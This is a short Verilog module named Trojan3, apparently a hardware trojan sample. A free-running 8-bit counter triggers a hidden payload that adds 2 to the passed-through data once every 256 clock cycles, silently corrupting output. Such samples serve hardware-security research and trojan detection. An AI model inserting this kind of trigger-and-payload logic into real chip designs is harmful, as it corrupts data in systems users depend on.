module Trojan3 (
    input wire clk,
    input wire rst,
    input wire [15:0] data_in,
    output reg [15:0] data_out
);
    reg [7:0] counter;
    always @(posedge clk or posedge rst) begin
        if (rst)
            counter <= 8'b0;
        else
            counter <= counter + 1;
    end
    always @(posedge clk or posedge rst) begin
        if (rst)
            data_out <= data_in;
        else
            data_out <= (counter == 8'hFF) ? (data_in + 16'h0002) : data_in;
    end
endmodule